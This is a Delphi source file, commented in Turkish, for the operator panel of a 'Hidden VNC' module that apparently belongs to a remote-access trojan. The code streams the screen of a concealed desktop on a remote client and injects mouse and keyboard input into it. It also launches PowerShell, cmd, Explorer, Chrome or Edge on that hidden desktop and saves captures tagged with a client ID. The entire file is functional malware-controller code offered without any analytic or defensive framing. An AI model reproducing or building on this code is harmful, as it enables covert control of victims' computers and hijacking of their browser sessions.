unit UnitHiddenVNC;

interface

uses
  Winapi.Windows, Winapi.Messages,
  System.SysUtils, System.Variants, System.Classes, System.Types,
  System.JSON, System.SyncObjs,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs,
  Vcl.StdCtrls, Vcl.ExtCtrls, Vcl.ComCtrls, Vcl.Imaging.jpeg,
  ncLines;

type
  TSendJSONProc   = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TUnregisterProc = procedure(aLine: TncLine) of object;

  TForm10 = class(TForm)
    Panel1    : TPanel;
    StatusBar1: TStatusBar;
    PaintBox1 : TPaintBox;
    Button1   : TButton;
    Button2   : TButton;
    Button3   : TButton;
    ComboBox1 : TComboBox;
    ComboBox2 : TComboBox;

    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure PaintBox1Paint(Sender: TObject);
    procedure ComboBox1Change(Sender: TObject);
    procedure PaintBox1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure PaintBox1MouseMove(Sender: TObject; Shift: TShiftState;
      X, Y: Integer);
    procedure PaintBox1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure FormKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure FormKeyUp(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure FormKeyPress(Sender: TObject; var Key: Char);

  private
    FLine        : TncLine;
    FClientID    : string;
    FSendJSON    : TSendJSONProc;
    FUnregister  : TUnregisterProc;
    FIsCapturing : Boolean;

    FLock        : TCriticalSection;
    FPendingBytes: TBytes;
    FPendingFrameWidth : Integer;
    FPendingFrameHeight: Integer;
    FPendingFrameFormat: Integer;
    FPendingDirtyX     : Integer;
    FPendingDirtyY     : Integer;
    FPendingDirtyW     : Integer;
    FPendingDirtyH     : Integer;
    FPendingFPS        : Integer;
    FHasFrame    : Boolean;
    FIsDecoding  : Boolean;

    FBitmap      : TBitmap;
    FBitmapLock  : TCriticalSection;
    FLastWidth   : Integer;
    FLastHeight  : Integer;
    FLastMouseMoveTime : Cardinal;
    FFPSFrameCount     : Integer;
    FFPSLastTick       : Cardinal;

    FFocusedHwnd : UInt64;

    FPaintBoxActive : Boolean;
    FCharKeyDown    : set of Byte;   // karakteri hvnc_char ile gönderilen tuşlar
    FSkipNextCharCode: Word;

    procedure LogToStatus(const Msg: string);
    procedure UpdateFrameStatus(HeaderFPS: Integer);

    procedure SendControlCommand(const Action: string;
      X: Integer = -1; Y: Integer = -1;
      Button: Integer = -1; KeyCode: Integer = -1;
      InjectFocus: Boolean = False);

    procedure DisableChildFocus;
    procedure WMSetFocus(var Message: TWMSetFocus); message WM_SETFOCUS;

  public
    constructor Create(AOwner: TComponent); override;
    destructor  Destroy; override;

    procedure SetupForClient(aLine: TncLine; const ClientID: string;
      ASendJSON: TSendJSONProc; AUnregister: TUnregisterProc);
    procedure DetachCallbacks;
    procedure HandleHVNCJSON(JSONObj: TJSONObject);
    procedure QueueFrameBytes(const Bytes: TBytes; FrameWidth: Integer = 0;
      FrameHeight: Integer = 0; FrameFormat: Integer = 1; DirtyX: Integer = 0;
      DirtyY: Integer = 0; DirtyW: Integer = 0; DirtyH: Integer = 0;
      FPS: Integer = 0);
  end;

var
  Form10: TForm10;

implementation

{$R *.dfm}

const
  HVNC_FRAME_FORMAT_JPEG_FULL  = 1;
  HVNC_FRAME_FORMAT_JPEG_DIRTY = 2;

// -------------------------------------------------------------------------
//  Constructor / Destructor
// -------------------------------------------------------------------------
constructor TForm10.Create(AOwner: TComponent);
begin
  inherited;
  DoubleBuffered := True;
  if Assigned(Panel1) then Panel1.DoubleBuffered := True;
  FLock           := TCriticalSection.Create;
  FBitmapLock     := TCriticalSection.Create;
  FBitmap         := TBitmap.Create;
  FIsCapturing    := False;
  FLastWidth      := 0;
  FLastHeight     := 0;
  FLastMouseMoveTime := 0;
  FFPSFrameCount := 0;
  FFPSLastTick := 0;
  FHasFrame       := False;
  FPendingFPS     := 0;
  FFocusedHwnd    := 0;
  FPaintBoxActive := False;
  KeyPreview      := True;
  FCharKeyDown    := [];
  FSkipNextCharCode := 0;

  ComboBox1.Items.Clear;
  ComboBox1.Items.Add('10%');
  ComboBox1.Items.Add('20%');
  ComboBox1.Items.Add('30%');
  ComboBox1.Items.Add('40%');
  ComboBox1.Items.Add('50%');
  ComboBox1.Items.Add('60%');
  ComboBox1.Items.Add('70%');
  ComboBox1.Items.Add('80%');
  ComboBox1.Items.Add('90%');
  ComboBox1.Items.Add('100%');
  ComboBox1.ItemIndex := 4;

  ComboBox2.Items.Clear;
  ComboBox2.Items.Add('powershell.exe');
  ComboBox2.Items.Add('cmd.exe');
  ComboBox2.Items.Add('explorer.exe');
  ComboBox2.Items.Add('Google Chrome');
  ComboBox2.Items.Add('Microsoft Edge');
  ComboBox2.ItemIndex := 0;

  PaintBox1.ControlStyle := PaintBox1.ControlStyle + [csDoubleClicks, csOpaque];
end;

destructor TForm10.Destroy;
begin
  FBitmap.Free;
  FBitmapLock.Free;
  FLock.Free;
  inherited;
end;

// -------------------------------------------------------------------------
//  Child focus engelleme
// -------------------------------------------------------------------------
procedure TForm10.DisableChildFocus;
var
  I: Integer;
begin
  for I := 0 to ControlCount - 1 do
  begin
    if Controls[I] is TButton then
      (Controls[I] as TButton).TabStop := False
    else if Controls[I] is TComboBox then
      (Controls[I] as TComboBox).TabStop := False;
  end;

  if Assigned(Panel1) then
    for I := 0 to Panel1.ControlCount - 1 do
    begin
      if Panel1.Controls[I] is TButton then
        (Panel1.Controls[I] as TButton).TabStop := False
      else if Panel1.Controls[I] is TComboBox then
        (Panel1.Controls[I] as TComboBox).TabStop := False;
    end;
end;

procedure TForm10.WMSetFocus(var Message: TWMSetFocus);
begin
  inherited;
  if FPaintBoxActive then
    ActiveControl := nil;
end;

// -------------------------------------------------------------------------
//  Public Setup
// -------------------------------------------------------------------------
procedure TForm10.SetupForClient(aLine: TncLine; const ClientID: string;
  ASendJSON: TSendJSONProc; AUnregister: TUnregisterProc);
begin
  FLine         := aLine;
  FClientID     := ClientID;
  FSendJSON     := ASendJSON;
  FUnregister   := AUnregister;
  Caption       := 'Hidden VNC - ' + FClientID;
  FFocusedHwnd  := 0;

  FIsCapturing    := False;
  Button1.Caption := 'Start Capturing';
  Button1.OnClick := Button1Click;
  Button2.OnClick := Button2Click;
  Button3.OnClick := Button3Click;
  ComboBox1.OnChange := ComboBox1Change;

  OnClose    := FormClose;
  OnKeyDown  := FormKeyDown;
  OnKeyUp    := FormKeyUp;
  OnKeyPress := FormKeyPress;

  PaintBox1.OnMouseDown := PaintBox1MouseDown;
  PaintBox1.OnMouseMove := PaintBox1MouseMove;
  PaintBox1.OnMouseUp   := PaintBox1MouseUp;
  PaintBox1.OnPaint     := PaintBox1Paint;

  DisableChildFocus;
  FCharKeyDown := [];
  FSkipNextCharCode := 0;
  LogToStatus('Ready');
end;

procedure TForm10.DetachCallbacks;
begin
  FLine       := nil;
  FSendJSON   := nil;
  FUnregister := nil;
end;

// -------------------------------------------------------------------------
//  Form Close
// -------------------------------------------------------------------------
procedure TForm10.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if FIsCapturing then
    Button1Click(nil);

  if Assigned(FUnregister) and Assigned(FLine) then
    FUnregister(FLine);

  Action := caFree;
end;

// -------------------------------------------------------------------------
//  Log ve FPS bilgisi
// -------------------------------------------------------------------------
procedure TForm10.LogToStatus(const Msg: string);
begin
  if not Assigned(StatusBar1) then Exit;
  StatusBar1.SimplePanel := True;
  StatusBar1.SimpleText := Msg;
  if StatusBar1.Panels.Count > 0 then
    StatusBar1.Panels[0].Text := Msg;
  StatusBar1.Update;
end;

procedure TForm10.UpdateFrameStatus(HeaderFPS: Integer);
var
  NowTick   : Cardinal;
  Elapsed   : Cardinal;
  RenderFPS : Integer;
begin
  Inc(FFPSFrameCount);
  NowTick := GetTickCount;
  if FFPSLastTick = 0 then
    FFPSLastTick := NowTick;
  Elapsed := NowTick - FFPSLastTick;
  if Elapsed < 1000 then
  begin
    if (FFPSFrameCount = 1) and (HeaderFPS > 0) then
      LogToStatus(Format('FPS: %d | Render: ... | %dx%d', [HeaderFPS, FLastWidth, FLastHeight]));
    Exit;
  end;
  RenderFPS := Round((FFPSFrameCount * 1000) / Elapsed);
  if HeaderFPS > 0 then
    LogToStatus(Format('FPS: %d | Render: %d | %dx%d', [HeaderFPS, RenderFPS, FLastWidth, FLastHeight]))
  else
    LogToStatus(Format('FPS: %d | %dx%d', [RenderFPS, FLastWidth, FLastHeight]));
  FFPSFrameCount := 0;
  FFPSLastTick := NowTick;
end;

// -------------------------------------------------------------------------
//  Frame kuyruğu ve JPEG decode (arka planda)
// -------------------------------------------------------------------------
procedure TForm10.QueueFrameBytes(const Bytes: TBytes; FrameWidth: Integer;
  FrameHeight: Integer; FrameFormat: Integer; DirtyX: Integer; DirtyY: Integer;
  DirtyW: Integer; DirtyH: Integer; FPS: Integer);
begin
  if (csDestroying in ComponentState) then Exit;

  FLock.Enter;
  try
    FPendingBytes       := Copy(Bytes);
    FPendingFrameWidth  := FrameWidth;
    FPendingFrameHeight := FrameHeight;
    FPendingFrameFormat := FrameFormat;
    FPendingDirtyX      := DirtyX;
    FPendingDirtyY      := DirtyY;
    FPendingDirtyW      := DirtyW;
    FPendingDirtyH      := DirtyH;
    FPendingFPS         := FPS;
    FHasFrame           := True;
    if FIsDecoding then Exit;
    FIsDecoding := True;
  finally
    FLock.Leave;
  end;

  TThread.CreateAnonymousThread(
    procedure
    var
      LocalBytes : TBytes;
      LocalWidth : Integer;
      LocalHeight: Integer;
      LocalFormat: Integer;
      LocalDirtyX: Integer;
      LocalDirtyY: Integer;
      LocalDirtyW: Integer;
      LocalDirtyH: Integer;
      LocalFPS   : Integer;
      MS         : TMemoryStream;
      JPG        : TJPEGImage;
      TempBmp    : TBitmap;
    begin
      while True do
      begin
        FLock.Enter;
        try
          if not FHasFrame then
          begin
            FIsDecoding := False;
            Exit;
          end;
          LocalBytes  := FPendingBytes;
          LocalWidth  := FPendingFrameWidth;
          LocalHeight := FPendingFrameHeight;
          LocalFormat := FPendingFrameFormat;
          LocalDirtyX := FPendingDirtyX;
          LocalDirtyY := FPendingDirtyY;
          LocalDirtyW := FPendingDirtyW;
          LocalDirtyH := FPendingDirtyH;
          LocalFPS    := FPendingFPS;

          FPendingBytes := nil;
          FHasFrame     := False;
        finally
          FLock.Leave;
        end;

        if Length(LocalBytes) = 0 then Continue;

        TempBmp := TBitmap.Create;
        MS      := TMemoryStream.Create;
        JPG     := TJPEGImage.Create;
        try
          MS.WriteBuffer(LocalBytes[0], Length(LocalBytes));
          MS.Position := 0;
          try
            JPG.LoadFromStream(MS);
            TempBmp.Assign(JPG);

            TThread.Synchronize(nil,
              procedure
              begin
                if (csDestroying in ComponentState) then Exit;

                FBitmapLock.Enter;
                try
                  if (LocalWidth <= 0) or (LocalHeight <= 0) then
                  begin
                    FBitmap.Assign(TempBmp);
                  end
                  else if (LocalFormat = HVNC_FRAME_FORMAT_JPEG_DIRTY) then
                  begin
                    if (FBitmap.Width <> LocalWidth) or (FBitmap.Height <> LocalHeight) then
                    begin
                      FBitmap.PixelFormat := pf24bit;
                      FBitmap.SetSize(LocalWidth, LocalHeight);
                      FBitmap.Canvas.Brush.Color := clBlack;
                      FBitmap.Canvas.FillRect(Rect(0, 0, LocalWidth, LocalHeight));
                    end;

                    if (LocalDirtyW <= 0) or (LocalDirtyH <= 0) then
                      FBitmap.Canvas.Draw(LocalDirtyX, LocalDirtyY, TempBmp)
                    else
                      FBitmap.Canvas.StretchDraw(Rect(LocalDirtyX, LocalDirtyY,
                        LocalDirtyX + LocalDirtyW, LocalDirtyY + LocalDirtyH), TempBmp);
                  end
                  else
                  begin
                    FBitmap.Assign(TempBmp);
                  end;

                  FLastWidth  := FBitmap.Width;
                  FLastHeight := FBitmap.Height;
                finally
                  FBitmapLock.Leave;
                end;
                PaintBox1.Invalidate;
                UpdateFrameStatus(LocalFPS);
              end);
          except
          end;
        finally
          JPG.Free;
          MS.Free;
          TempBmp.Free;
        end;
      end;
    end).Start;
end;

// -------------------------------------------------------------------------
//  JSON kontrol komutu gönder
// -------------------------------------------------------------------------
procedure TForm10.SendControlCommand(const Action: string;
  X, Y, Button, KeyCode: Integer; InjectFocus: Boolean);
var
  JSONObj : TJSONObject;
  NormX   : Integer;
  NormY   : Integer;
begin
  if not FIsCapturing or not Assigned(FSendJSON) or not Assigned(FLine) then
    Exit;

  NormX := 0;
  NormY := 0;
  if (X <> -1) and (PaintBox1.Width > 0) then
    NormX := Round((X / PaintBox1.Width)  * 65535);
  if (Y <> -1) and (PaintBox1.Height > 0) then
    NormY := Round((Y / PaintBox1.Height) * 65535);

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', Action);
    if X       <> -1 then JSONObj.AddPair('x',       TJSONNumber.Create(NormX));
    if Y       <> -1 then JSONObj.AddPair('y',       TJSONNumber.Create(NormY));
    if Button  <> -1 then JSONObj.AddPair('button',  TJSONNumber.Create(Button));
    if KeyCode <> -1 then JSONObj.AddPair('keycode', TJSONNumber.Create(KeyCode));
    if InjectFocus and (FFocusedHwnd <> 0) then
      JSONObj.AddPair('focused_hwnd', TJSONNumber.Create(FFocusedHwnd));
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

// -------------------------------------------------------------------------
//  Buton tıklamaları
// -------------------------------------------------------------------------
procedure TForm10.Button1Click(Sender: TObject);
var
  JSONObj    : TJSONObject;
  QualityStr : string;
  QualityVal : Integer;
begin
  if not Assigned(FSendJSON) or not Assigned(FLine) then Exit;

  FIsCapturing := not FIsCapturing;

  JSONObj := TJSONObject.Create;
  try
    if FIsCapturing then
    begin
      QualityStr := StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]);
      QualityVal := StrToIntDef(QualityStr, 50);
      JSONObj.AddPair('action',  'hvnc_start');
      JSONObj.AddPair('quality', TJSONNumber.Create(QualityVal));
      Button1.Caption := 'Stop Capturing';
      FFPSFrameCount := 0;
      FFPSLastTick := 0;
      LogToStatus('Starting Hidden VNC...');
    end
    else
    begin
      JSONObj.AddPair('action', 'hvnc_stop');
      Button1.Caption  := 'Start Capturing';
      FFocusedHwnd     := 0;
      FPaintBoxActive  := False;
      FCharKeyDown     := [];
      FSkipNextCharCode := 0;
      LogToStatus('Stopping Hidden VNC...');
    end;
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;

  ActiveControl := nil;
  SetFocus;
end;

procedure TForm10.Button2Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FSendJSON) or not Assigned(FLine) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'hvnc_run');
    JSONObj.AddPair('path',   ComboBox2.Text);
    FSendJSON(FLine, JSONObj);
    LogToStatus('Executing ' + ComboBox2.Text + ' in hidden desktop...');
  finally
    JSONObj.Free;
  end;

  ActiveControl := nil;
  SetFocus;
end;

procedure TForm10.Button3Click(Sender: TObject);
var
  SD  : TSaveDialog;
  JPG : TJPEGImage;
begin
  if FBitmap.Empty then
  begin
    LogToStatus('No frame to save.');
    Exit;
  end;

  SD := TSaveDialog.Create(Self);
  try
    SD.Title      := 'Save Screenshot';
    SD.DefaultExt := 'jpg';
    SD.Filter     := 'JPEG Image (*.jpg)|*.jpg';
    SD.FileName   := 'hvnc_' + FClientID + '_' +
                     FormatDateTime('yyyymmdd_hhnnss', Now) + '.jpg';
    if SD.Execute then
    begin
      JPG := TJPEGImage.Create;
      try
        JPG.Assign(FBitmap);
        JPG.SaveToFile(SD.FileName);
        LogToStatus('Screenshot saved: ' + ExtractFileName(SD.FileName));
      finally
        JPG.Free;
      end;
    end;
  finally
    SD.Free;
  end;

  ActiveControl := nil;
  SetFocus;
end;

// -------------------------------------------------------------------------
//  ComboBox kalite değişimi
// -------------------------------------------------------------------------
procedure TForm10.ComboBox1Change(Sender: TObject);
var
  JSONObj    : TJSONObject;
  QualityStr : string;
  QualityVal : Integer;
begin
  if not FIsCapturing or not Assigned(FSendJSON) or not Assigned(FLine) then
    Exit;

  QualityStr := StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]);
  QualityVal := StrToIntDef(QualityStr, 50);

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action',  'hvnc_quality');
    JSONObj.AddPair('quality', TJSONNumber.Create(QualityVal));
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;

  ActiveControl := nil;
  SetFocus;
end;

// -------------------------------------------------------------------------
//  JSON mesaj işleme (yanıtlar)
// -------------------------------------------------------------------------
procedure TForm10.HandleHVNCJSON(JSONObj: TJSONObject);
var
  Action   : string;
  HwndVal  : TJSONValue;
  HwndNum  : UInt64;
begin
  if not Assigned(JSONObj) then Exit;
  if not Assigned(JSONObj.GetValue('action')) then Exit;

  Action := JSONObj.GetValue('action').Value;

  if Action = 'hvnc_status' then
  begin
    if Assigned(JSONObj.Values['message']) then
      LogToStatus(JSONObj.Values['message'].Value);
  end
  else if Action = 'hvnc_error' then
  begin
    if Assigned(JSONObj.Values['message']) then
    begin
      LogToStatus('Error: ' + JSONObj.Values['message'].Value);
      FIsCapturing    := False;
      Button1.Caption := 'Start Capturing';
      FFocusedHwnd    := 0;
      FPaintBoxActive := False;
    end;
  end
  else if Action = 'hvnc_focus_ack' then
  begin
    HwndVal := JSONObj.Values['hwnd'];
    if Assigned(HwndVal) then
    begin
      try
        HwndNum := StrToUInt64(HwndVal.Value);
        if HwndNum <> FFocusedHwnd then
        begin
          FFocusedHwnd := HwndNum;
          LogToStatus('Focus: HWND 0x' + IntToHex(FFocusedHwnd, 8));
        end;
      except
      end;
    end;
  end;
end;

// -------------------------------------------------------------------------
//  PaintBox boyama
// -------------------------------------------------------------------------
procedure TForm10.PaintBox1Paint(Sender: TObject);
begin
  FBitmapLock.Enter;
  try
    if not FBitmap.Empty then
      PaintBox1.Canvas.StretchDraw(PaintBox1.ClientRect, FBitmap);
  finally
    FBitmapLock.Leave;
  end;
end;

// -------------------------------------------------------------------------
//  Mouse olayları
// -------------------------------------------------------------------------
procedure TForm10.PaintBox1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  BtnIdx: Integer;
  Action: string;
begin
  BtnIdx := 0;
  if Button = mbRight  then BtnIdx := 1;
  if Button = mbMiddle then BtnIdx := 2;

  Action := 'hvnc_mousedown';
  if ssDouble in Shift then
    Action := 'hvnc_doubleclick';

  FPaintBoxActive := True;
  ActiveControl   := nil;
  SetFocus;

  SendControlCommand(Action, X, Y, BtnIdx, -1, False);
end;

procedure TForm10.PaintBox1MouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
  if GetTickCount - FLastMouseMoveTime < 45 then Exit;
  FLastMouseMoveTime := GetTickCount;
  SendControlCommand('hvnc_mousemove', X, Y, -1, -1, False);
end;

procedure TForm10.PaintBox1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  BtnIdx: Integer;
begin
  BtnIdx := 0;
  if Button = mbRight  then BtnIdx := 1;
  if Button = mbMiddle then BtnIdx := 2;
  SendControlCommand('hvnc_mouseup', X, Y, BtnIdx, -1, False);
end;

// -------------------------------------------------------------------------
//  Klavye işleyicileri
//  - Normal metin OnKeyPress'ten Unicode hvnc_char olarak gönderilir
//  - Ctrl/Alt kısayolları ve kontrol tuşları keydown/keyup olarak iletilir
// -------------------------------------------------------------------------
procedure TForm10.FormKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
var
  OriginalKey: Word;
  HasModifier: Boolean;
  IsTextKey: Boolean;
begin
  if not FPaintBoxActive then Exit;

  OriginalKey := Key;
  HasModifier := (ssCtrl in Shift) or (ssAlt in Shift);
  IsTextKey :=
    (OriginalKey = VK_SPACE) or
    (OriginalKey in [Ord('A')..Ord('Z')]) or
    (OriginalKey in [Ord('0')..Ord('9')]) or
    (OriginalKey in [VK_NUMPAD0..VK_DIVIDE]) or
    (OriginalKey in [VK_OEM_1, VK_OEM_PLUS, VK_OEM_COMMA, VK_OEM_MINUS,
      VK_OEM_PERIOD, VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5, VK_OEM_6,
      VK_OEM_7, VK_OEM_8, VK_OEM_102]);

  // Enter / Space'in UI butonunu tetiklemesini engelle
  if (Key = VK_RETURN) or (Key = VK_SPACE) then
    Key := 0;

  if HasModifier or not IsTextKey then
  begin
    // Ctrl/Alt kombinasyonları ve karakter üretmeyen tuşlar keydown/keyup gider
    SendControlCommand('hvnc_keydown', -1, -1, -1, OriginalKey, True);
  end
  else
  begin
    // Space KeyDown'da bastırıldığı için KeyPress'e kalmadan doğrudan gönderilir.
    // Diğer metin tuşlarında gerçek Unicode karakteri FormKeyPress gönderir.
    if OriginalKey = VK_SPACE then
    begin
      SendControlCommand('hvnc_char', -1, -1, -1, Ord(' '), True);
      FSkipNextCharCode := Ord(' ');
    end;

    if OriginalKey <= High(Byte) then
      Include(FCharKeyDown, OriginalKey);
  end;
end;

procedure TForm10.FormKeyUp(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if not FPaintBoxActive then Exit;

  if (Key <= High(Byte)) and (Key in FCharKeyDown) then
  begin
    Exclude(FCharKeyDown, Key);
    Exit;
  end;

  SendControlCommand('hvnc_keyup', -1, -1, -1, Key, True);
end;

procedure TForm10.FormKeyPress(Sender: TObject; var Key: Char);
begin
  if not FPaintBoxActive then Exit;

  if (FSkipNextCharCode <> 0) and (Ord(Key) = FSkipNextCharCode) then
  begin
    FSkipNextCharCode := 0;
    Key := #0;
    Exit;
  end;
  FSkipNextCharCode := 0;

  // Ctrl+A/C/V/X gibi kısayollar KeyPress'te #1/#3/#22/#24 üretir; bunları
  // karakter olarak göndermek kısayolu bozar ve garip karakterlere yol açar.
  if Ord(Key) < 32 then
  begin
    Key := #0;
    Exit;
  end;

  SendControlCommand('hvnc_char', -1, -1, -1, Ord(Key), True);
  Key := #0;
end;

end.

